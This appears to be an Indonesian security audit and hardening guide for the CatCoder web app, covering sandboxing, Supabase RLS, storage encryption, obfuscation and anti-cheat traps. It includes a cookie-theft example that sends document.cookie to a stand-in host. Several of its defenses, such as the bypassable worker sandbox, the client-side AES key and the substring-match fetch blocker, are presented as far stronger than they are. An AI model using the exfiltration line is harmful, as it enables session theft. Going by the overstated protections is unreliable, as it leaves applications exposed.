# 🛡️ SECURITY AUDIT & GOD MODE BLUEPRINT: PROJECT CATCODER

**Date:** December 29, 2025
**Project:** CatCoder (React/Vite/Supabase)
**Status:** 🚨 CRITICAL VULNERABILITY FOUND
**Target Security Level:** GOD MODE (Zero Trust / Anti-Cheat / Hardened)

---

## 📋 EXECUTIVE SUMMARY

Berdasarkan audit struktur project `CatCoder`, saat ini aplikasi berada dalam kondisi **"Glass House" (Rumah Kaca)**.
1.  **Code Execution:** Menggunakan `new Function()` di main thread (Sangat berbahaya, rentan XSS total).
2.  **Game Economy (XP):** Logika ada di Client-side (`useProgressStore`), memungkinkan user memanipulasi XP via Console.
3.  **Data Persistence:** LocalStorage menyimpan data progress tanpa enkripsi.

Dokumen ini berisi panduan teknis langkah-demi-langkah untuk mengubah arsitektur keamanan menjadi **Fort Knox**.

---

## ⚔️ PHASE 1: THE EXECUTION ENGINE (CRITICAL)
**Target:** Mencegah User menjalankan script berbahaya (XSS) di browser mereka sendiri atau mencuri token via `document.cookie`.

### 🚨 Masalah Saat Ini
File: `src/hooks/useCodeRunner.ts`
User code berjalan di Main Thread. User bisa mengetik `window.location.href = 'hacker.com?cookie=' + document.cookie`.

### ✅ Solusi God Mode: Web Worker Sandbox
Pindahkan eksekusi ke thread terpisah yang terisolasi.

**1. Buat File Worker (`public/worker.js`)**
```javascript
// public/worker.js
self.onmessage = function(e) {
    const { code, input } = e.data;
    
    // 1. Whitelist API (Hapus akses ke window, document, fetch)
    const safeConsole = {
        log: (...args) => self.postMessage({ type: 'log', data: args.join(' ') }),
        error: (...args) => self.postMessage({ type: 'error', data: args.join(' ') })
    };

    // 2. Shadow Realm (Isolasi Scope)
    try {
        const func = new Function('console', 'window', 'document', 'fetch', 'XMLHttpRequest', 'localStorage', `
            "use strict";
            ${code}
        `);
        
        // Pass null ke variabel berbahaya
        func(safeConsole, null, null, null, null, null);
        
        self.postMessage({ type: 'success' });
    } catch (err) {
        self.postMessage({ type: 'error', data: err.toString() });
    }
};
2. Update Hook (src/hooks/useCodeRunner.ts)TypeScriptconst runCode = (code: string) => {
    return new Promise((resolve, reject) => {
        const worker = new Worker('/worker.js');
        
        // Timeout 3 detik (Mencegah Infinite Loop crash browser)
        const timeout = setTimeout(() => {
            worker.terminate();
            reject('Execution Timed Out (Infinite Loop detected?)');
        }, 3000);

        worker.onmessage = (e) => {
            if (e.data.type === 'log') { /* Handle Output */ }
            if (e.data.type === 'success') {
                clearTimeout(timeout);
                worker.terminate();
                resolve('Success');
            }
        };

        worker.postMessage({ code });
    });
};
⚔️ PHASE 2: DATABASE & LOGIC HARDENINGTarget: Mencegah manipulasi XP/Level (Anti-Cheat) via Console Browser.🚨 Masalah Saat IniFile: src/stores/useProgressStore.tsFrontend memanggil addXP(100). Hacker bisa memanggil useUserStore.getState().addXP(999999).✅ Solusi God Mode: Server-Side Authority (RLS & RPC)1. Supabase SQL: Kunci Table (Row Level Security)Jalankan ini di SQL Editor Supabase:SQL-- Cabut izin tulis langsung dari frontend
REVOKE INSERT, UPDATE, DELETE ON user_progress FROM anon, authenticated;
REVOKE UPDATE ON profiles FROM anon, authenticated;

-- Hanya izinkan Read (Select) data sendiri
ALTER TABLE user_progress ENABLE ROW LEVEL SECURITY;
CREATE POLICY "View Own Progress" ON user_progress 
FOR SELECT USING (auth.uid() = user_id);
2. Supabase SQL: Buat "Wasit" (RPC Function)Hanya fungsi ini yang boleh memberi XP.SQLCREATE OR REPLACE FUNCTION submit_answer(
  p_problem_id UUID,
  p_code TEXT
) RETURNS JSONB
LANGUAGE plpgsql SECURITY DEFINER AS $$
DECLARE
  v_xp_reward INT := 100; -- Set XP fix di server, bukan parameter input
BEGIN
  -- Logika Validasi disini (Optional: simpan jawaban user)
  
  -- 1. Insert Progress
  INSERT INTO user_progress (user_id, content_id, status, score)
  VALUES (auth.uid(), p_problem_id, 'completed', 100)
  ON CONFLICT (user_id, content_id) DO NOTHING;

  -- 2. Update Profile XP
  UPDATE profiles 
  SET xp = xp + v_xp_reward 
  WHERE id = auth.uid();

  RETURN jsonb_build_object('success', true, 'xp_gained', v_xp_reward);
END;
$$;
3. Update Frontend StoreHapus logika set((state) => ({ xp: state.xp + amount })). Ganti dengan:TypeScriptconst submitAnswer = async (problemId, code) => {
    const { data, error } = await supabase.rpc('submit_answer', { 
        p_problem_id: problemId, 
        p_code: code 
    });
    if (data.success) {
        // Refresh data profile dari server
        fetchUserProfile(); 
    }
};
⚔️ PHASE 3: STORAGE ENCRYPTIONTarget: Mencegah user mengedit LocalStorage untuk membuka fitur premium/level.🚨 Masalah Saat IniData disimpan sebagai JSON plain text di localStorage. Mudah diedit.✅ Solusi God Mode: AES EncryptionInstall: npm install crypto-jsUpdate Store (src/stores/index.ts)TypeScriptimport { create } from 'zustand';
import { persist, createJSONStorage } from 'zustand/middleware';
import CryptoJS from 'crypto-js';

const SECRET_KEY = import.meta.env.VITE_ENC_KEY || 'default-secret';

const secureStorage = {
  getItem: (name: string) => {
    const str = localStorage.getItem(name);
    if (!str) return null;
    try {
      const bytes = CryptoJS.AES.decrypt(str, SECRET_KEY);
      return JSON.parse(bytes.toString(CryptoJS.enc.Utf8));
    } catch { return null; }
  },
  setItem: (name: string, value: any) => {
    const encrypted = CryptoJS.AES.encrypt(JSON.stringify(value), SECRET_KEY).toString();
    localStorage.setItem(name, encrypted);
  },
  removeItem: (name: string) => localStorage.removeItem(name),
};

export const useUserStore = create(
  persist(
    (set) => ({ ... }),
    { 
      name: 'catcoder-secure-storage', 
      storage: createJSONStorage(() => secureStorage) 
    }
  )
);
⚔️ PHASE 4: FRONTEND OBFUSCATION & CSPTarget: Mencegah Code Theft dan XSS Injection dari external source.✅ Solusi God Mode1. Code Obfuscation (vite.config.ts)Mempersulit hacker membaca source code (Reverse Engineering).npm install -D rollup-plugin-obfuscator javascript-obfuscatorTypeScriptimport { obfuscator } from 'rollup-plugin-obfuscator';

export default defineConfig({
  plugins: [
    // ... plugin react dll
    obfuscator({
      global: true,
      compact: true,
      controlFlowFlattening: true,
      deadCodeInjection: true,
      stringArray: true,
      stringArrayEncoding: ['rc4'],
    }),
  ],
});
2. Content Security Policy (index.html)Pasang di dalam tag <head>. Ini adalah firewall browser.HTML<meta http-equiv="Content-Security-Policy" content="
    default-src 'none';
    script-src 'self' 'unsafe-eval'; 
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https://*.supabase.co;
    connect-src 'self' https://*.supabase.co;
    font-src 'self';
    worker-src 'self' blob:;
">
(Catatan: unsafe-eval mungkin dibutuhkan untuk Pyodide/Worker, tapi dibatasi hanya di worker scope).⚔️ PHASE 5: ACTIVE DEFENSE (JEBAKAN BATMAN)Target: Mendeteksi dan mengganggu Hacker yang membuka Developer Tools.File: src/utils/security.ts (Panggil di main.tsx)TypeScriptexport const activeDefense = () => {
    if (import.meta.env.DEV) return;

    // 1. Disable Klik Kanan & Shortcut
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('keydown', e => {
        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
            e.preventDefault();
        }
    });

    // 2. Debugger Trap (Membuat Browser Hang jika DevTools buka)
    setInterval(() => {
        const start = performance.now();
        debugger; // Breakpoint
        if (performance.now() - start > 100) {
            // Terdeteksi user membuka DevTools
            document.body.innerHTML = '<h1 style="color:red;text-align:center;margin-top:20%">SYSTEM SECURITY ALERT: ILLEGAL ACCESS DETECTED</h1>';
            // Opsional: Logout paksa / Lapor ke server
        }
    }, 2000);
};
🏁 CHECKLIST IMPLEMENTASIStatusTaskPriority⬜Migrasi useCodeRunner ke Web Worker🔥 CRITICAL⬜Setup RLS (Row Level Security) di Supabase🔥 CRITICAL⬜Implementasi RPC submit_answer (Pindah Logic XP)🔥 CRITICAL⬜Pasang Enkripsi LocalStorage (Zustand)🟡 HIGH⬜Config Vite Obfuscator🟡 HIGH⬜Pasang CSP Header di index.html🟢 MEDIUM⬜Pasang Active Defense Script🟢 MEDIUM


## ⚔️ PHASE 6: PARANOID EXTRAS (THE ULTIMATE LAYER)
**Target:** Identifikasi, Pelacakan, dan Psychological Warfare melawan Hacker.

### 1. DIGITAL DNA LOCK (Device Fingerprinting)
**Masalah:** Jika hacker mencuri Session Token (cookie) user, mereka bisa login dari komputer hacker.
**Solusi God Mode:** Kunci akun ke **Fisik Perangkat**.

**Implementasi:**
Install: `npm install @fingerprintjs/fingerprintjs`

**Logic (di `src/hooks/useAuth.ts`):**
```typescript
import FingerprintJS from '@fingerprintjs/fingerprintjs';

// 1. Saat Login, simpan Fingerprint Hash ke Database
const fp = await FingerprintJS.load();
const { visitorId } = await fp.get();

await supabase.from('active_sessions').insert({
  user_id: userId,
  device_hash: visitorId, // Hash unik hardware (CPU+GPU+Screen)
  ip_address: userIP
});

// 2. Middleware/Check di setiap sesi penting (misal: mau submit code)
const currentFp = await fp.get();
if (currentFp.visitorId !== storedDeviceHash) {
    // ALARM: Session Token valid, tapi Hardware berubah!
    // Ini pasti pencurian cookie (Session Hijacking).
    await supabase.auth.signOut(); // Tendang hacker
    alert("SECURITY ALERT: Sesi dicuri! Login dari device berbeda terdeteksi.");
}
2. INVISIBLE WATERMARKING (Anti-Leak)
Masalah: User premium menscreenshot materi/soal rahasia dan menyebarkannya. Solusi God Mode: Tanamkan ID User secara tak kasat mata di seluruh layar. Jika screenshot bocor, kamu tahu siapa pelakunya.

Implementasi (CSS Overlay): Buat komponen Watermark.tsx yang merender User ID berulang kali di seluruh layar dengan opacity nyaris 0.

TypeScript

// components/common/Watermark.tsx
const Watermark = ({ userId }) => (
  <div className="pointer-events-none fixed inset-0 z-[9999] flex flex-wrap content-start overflow-hidden opacity-[0.03] select-none">
    {Array.from({ length: 100 }).map((_, i) => (
      <div key={i} className="m-8 -rotate-45 text-sm font-black text-black">
        {userId} • CATCODER PROTECTED
      </div>
    ))}
  </div>
);
Efek: Mata telanjang hampir tidak bisa melihatnya. Tapi jika screenshot diedit (kontras dinaikkan) di Photoshop, ID user akan muncul jelas.

3. HONEYPOT TOKENS (Jebakan Maling)
Masalah: Hacker suka mencari API Key di source code (Inspect Element -> Sources). Solusi God Mode: Berikan mereka kunci palsu yang bisa melacak mereka.

Implementasi:

Buka CanaryTokens.org.

Buat "Web Bug / URL Token".

Tanamkan token itu di file config palsu di kodemu.

Buat file: src/config/secret_admin.ts (File ini tidak dipakai aplikasi, cuma jebakan).

TypeScript

// DANGER: ADMIN KEYS - DO NOT COMMIT
export const ADMIN_CONFIG = {
    apiKey: "ct_fake_key_dont_use",
    // Ganti URL di bawah dengan URL dari CanaryTokens
    debugUrl: "[https://canarytokens.com/articles/tags/feedback/s7x9](https://canarytokens.com/articles/tags/feedback/s7x9)..." 
};

// Kalau hacker mencoba fetch(ADMIN_CONFIG.debugUrl), 
// Kamu dapat email notifikasi berisi IP dan Lokasi Hacker detik itu juga.
4. DOM INTEGRITY CHECK (Anti-Extension/Injector)
Masalah: Hacker pakai Extension Browser atau Script Monkey untuk memodifikasi soal/jawaban di layar (DOM Manipulation). Solusi God Mode: Deteksi perubahan HTML yang tidak sah.

Implementasi: Gunakan MutationObserver untuk mengawasi elemen vital (misal: Editor Code atau Score Display).

TypeScript

// Di dalam useEffect komponen CodeEditor
const observer = new MutationObserver((mutations) => {
  mutations.forEach((mutation) => {
    // Jika ada script asing disuntikkan
    if (mutation.addedNodes.length > 0) {
       mutation.addedNodes.forEach(node => {
          if (node.nodeName === 'SCRIPT' || node.nodeName === 'IFRAME') {
             // Hapus node jahat instan
             node.remove();
             // Flag akun sebagai cheater
             console.warn("ILLEGAL DOM MODIFICATION DETECTED");
             triggerSecurityLock(); 
          }
       });
    }
  });
});

observer.observe(document.body, { childList: true, subtree: true });
5. TIME TRAVEL PREVENTION (NTP Check)
Masalah: User mengubah jam di komputer/HP mereka untuk memanipulasi "Streak" atau mempercepat waktu tunggu tantangan. Solusi God Mode: Jangan percaya waktu user (new Date()). Selalu ambil waktu dari server.

Implementasi: Saat aplikasi load, ambil waktu server dan hitung offset (selisih).

TypeScript

// hooks/useServerTime.ts
let timeOffset = 0;

export const syncTime = async () => {
    const start = Date.now();
    const { data } = await supabase.rpc('get_server_time'); // Buat RPC simple return now()
    const end = Date.now();
    const latency = (end - start) / 2;
    const serverTime = new Date(data).getTime();
    
    // Hitung selisih waktu user vs server
    timeOffset = serverTime - Date.now() + latency;
};

// Gunakan ini pengganti Date.now()
export const getTrueTime = () => Date.now() + timeOffset;

// Jika selisih > 5 menit, blokir akses (User curang ganti jam)
if (Math.abs(timeOffset) > 1000 * 60 * 5) {
    alert("Jam sistem Anda tidak akurat. Mohon sinkronisasi waktu.");
    window.location.reload();
}

### **REKOMENDASI AKHIR DARI SAYA (THE GOLDEN ADVICE)**

Kamu sekarang punya daftar keamanan yang lebih lengkap daripada 95% startup di luar sana.

Tapi ingat: **"Security is a process, not a product."**

1.  **Jangan Over-Engineer Dulu:**
    Fokus selesaikan **Phase 1 (Web Worker)** dan **Phase 2 (Database RLS)** dulu. Itu lubang terbesarmu. Kalau itu belum beres, fitur "Paranoid" di Phase 6 tidak ada gunanya.

2.  **Test Sendiri (Pentest):**
    Setelah pasang fitur keamanan, coba hack aplikasimu sendiri.
    * Coba ketik `alert(1)` di code editor.
    * Coba edit `localStorage` XP.
    * Coba inspect element dan cari API Key.


    ## ⚔️ PHASE 7: BIOLOGICAL & BEHAVIORAL DEFENSE (ALIEN MODE)
**Target:** Membedakan User Asli vs Hacker yang punya Password User Asli.

### 1. KEYSTROKE DYNAMICS (Sidik Jari Ketikan)
**Konsep:** Setiap orang punya irama mengetik yang unik (seperti tanda tangan). Hacker mungkin tahu password user, tapi mereka tidak bisa meniru *kecepatan* dan *ritme* ketikan user asli saat coding.

**Implementasi (`src/hooks/useBehaviorAuth.ts`):**
Rekam irama ketikan saat user mengerjakan soal coding (CatCoder sangat cocok untuk ini karena user banyak mengetik).

```typescript
import { useEffect, useRef } from 'react';

export const useKeystrokeDynamics = () => {
  const flightTimes = useRef<number[]>([]);
  const lastKeyUp = useRef<number>(Date.now());

  const handleKeyDown = (e: KeyboardEvent) => {
    const now = Date.now();
    const flightTime = now - lastKeyUp.current; // Waktu antar ketikan
    lastKeyUp.current = now;
    
    // Simpan sampel (Max 50 terakhir)
    flightTimes.current.push(flightTime);
    if (flightTimes.current.length > 50) flightTimes.current.shift();
  };

  const verifyUser = () => {
    // Hitung rata-rata kecepatan
    const avg = flightTimes.current.reduce((a, b) => a + b, 0) / flightTimes.current.length;
    
    // Bandingkan dengan profile rata-rata user di database
    // Jika user biasanya ngetik cepat (avg 100ms) tiba-tiba jadi lambat (avg 500ms)
    // Atau ritmenya robotik (tepat 200ms setiap huruf -> BOT)
    if (avg < 50) { 
        // Terlalu cepat untuk manusia -> BOT PASTE
        triggerAntiBot(); 
    }
  };

  useEffect(() => {
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, []);
};
2. CLIENT-SIDE FIREWALL (Interceptor)
Konsep: Browser secara default mengizinkan aplikasi mengirim data ke mana saja. Kita akan memasang "Firewall" di dalam JavaScript untuk memblokir request keluar yang tidak sah.

Implementasi (src/main.tsx): Monkey-patch window.fetch dan XMLHttpRequest.

TypeScript

const originalFetch = window.fetch;
const ALLOWED_DOMAINS = [
  'supabase.co', 
  'jsdelivr.net', // Untuk Pyodide
  'catcoder.com'
];

window.fetch = async (...args) => {
  const url = args[0].toString();
  
  // Cek apakah URL tujuannya diizinkan
  const isAllowed = ALLOWED_DOMAINS.some(domain => url.includes(domain));
  
  if (!isAllowed) {
    console.error(`BLOCKED OUTBOUND CONNECTION TO: ${url}`);
    // Kirim laporan ke server kita (opsional)
    return Promise.reject(new Error("Firewall Blocked Request"));
  }

  return originalFetch(...args);
};
Efek: Jika hacker menyuntikkan script jahat yang mencoba mengirim data curian ke hacker-server.com, request itu akan gagal total di level browser.

⚔️ PHASE 8: THE "SCORCHED EARTH" (PROTOKOL HANCUR DIRI)
Target: Jika terdeteksi serangan, aplikasi akan "bunuh diri" di sisi client.

1. MEMORY WIPING (Pembersihan RAM)
Konsep: JavaScript punya Garbage Collection, jadi variabel sensitif (seperti token atau jawaban soal) sering tertinggal di RAM dan bisa di-dump oleh hacker. Solusi: Overwrite variabel sebelum dihapus.

Implementasi: Buat helper function untuk menghapus data sensitif.

TypeScript

export const wipeMemory = (data: any) => {
    if (typeof data === 'string') {
        // String di JS immutable, sulit dihapus total, 
        // tapi kita bisa replace referensinya dengan sampah
        return '0000000000000000'.repeat(10); 
    }
    if (Array.isArray(data) || data instanceof Uint8Array) {
        // Isi array dengan nol sebelum dibuang
        for (let i = 0; i < data.length; i++) {
            data[i] = 0;
        }
    }
    return null;
};

// Pakai saat logout atau komponen unmount
useEffect(() => {
    return () => {
        sensitiveData = wipeMemory(sensitiveData);
    };
}, []);
2. DOM SELF-DESTRUCT (Hancurkan UI)
Konsep: Jika integritas aplikasi terganggu (misal: Code Runner di-bypass, atau LocalStorage diedit paksa), aplikasi menolak untuk merender apapun.

Implementasi (src/App.tsx):

TypeScript

import { useUserStore } from './stores';

const App = () => {
  const isCompromised = useUserStore((state) => state.securityFlag);

  if (isCompromised) {
    // HAPUS ROOT ELEMENT
    document.getElementById('root')?.remove();
    
    // TAMPILKAN PESAN SERAM
    document.body.style.backgroundColor = 'black';
    document.body.innerHTML = `
      <div style="color: red; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column;">
        <h1>⛔ SYSTEM COMPROMISED ⛔</h1>
        <p>Security integrity check failed.</p>
        <p>Access terminated.</p>
      </div>
    `;
    
    // MATIKAN JS EXECUTION
    throw new Error("System Halted");
  }

  return <RouterProvider router={router} />;
};
⚔️ PHASE 9: LEGAL & SOCIAL ENGINEERING TRAPS
Target: Hacker Manusia (Social Engineers).

1. INVISIBLE "TERMS OF SERVICE" (Legal Trap)
Konsep: Hacker sering kali menggunakan bot/scraper. Implementasi: Di footer, buat link Terms of Service yang warnanya sama dengan background (invisible). Di dalam ToS itu, tulis klausul: "Jika Anda mengakses URL ini (yang tersembunyi bagi manusia), alamat IP Anda akan diblokir permanen dan dilaporkan sebagai bot jahat."

Lalu pasang tracking di halaman ToS tersembunyi itu. Siapapun yang mampir ke sana otomatis ke-ban IP-nya.

2. FAKE "ADMIN" ENDPOINTS (Routing Trap)
Konsep: Hacker akan mencoba menebak URL admin. Implementasi (React Router):

TypeScript

// src/routes.tsx
<Route path="/admin" element={<FakeAdminLogin />} />
<Route path="/administrator" element={<FakeAdminLogin />} />
<Route path="/dashboard/admin" element={<FakeAdminLogin />} />
<Route path="/wp-admin" element={<FakeAdminLogin />} />

// Component FakeAdminLogin
const FakeAdminLogin = () => {
  useEffect(() => {
    // LOG IP PELAKU DIAM-DIAM
    supabase.rpc('log_security_event', { type: 'illegal_admin_access' });
    
    // DELAY LOADING LAMA (Tarpit)
    setTimeout(() => {
       window.location.href = '[https://www.youtube.com/watch?v=dQw4w9WgXcQ](https://www.youtube.com/watch?v=dQw4w9WgXcQ)'; // Rickroll
    }, 10000);
  }, []);

  return <div>Loading Admin Panel...</div>; // Tampilan meyakinkan
};

### **RINGKASAN "GOD MODE" LENGKAP**

Kalau kamu menerapkan dari **Phase 1 sampai Phase 9**, ini yang terjadi pada **CatCoder**:

1.  **Code Runner:** Terisolasi di Web Worker + Whitelist API (Phase 1).
2.  **XP/Economy:** Dijaga oleh Server RPC + RLS Database (Phase 2).
3.  **Storage:** Terenkripsi AES (Phase 3).
4.  **Source Code:** Terobfuscasi + CSP Ketat (Phase 4).
5.  **Perangkat:** Terkunci via FingerprintJS (Phase 6).
6.  **Network:** Dikawal Client-side Firewall (Phase 7).
7.  **Bot/Hacker:** Terjebak di Honeypot URL & Fake Admin (Phase 9).
8.  **Keadaan Darurat:** UI menghancurkan diri sendiri (Phase 8).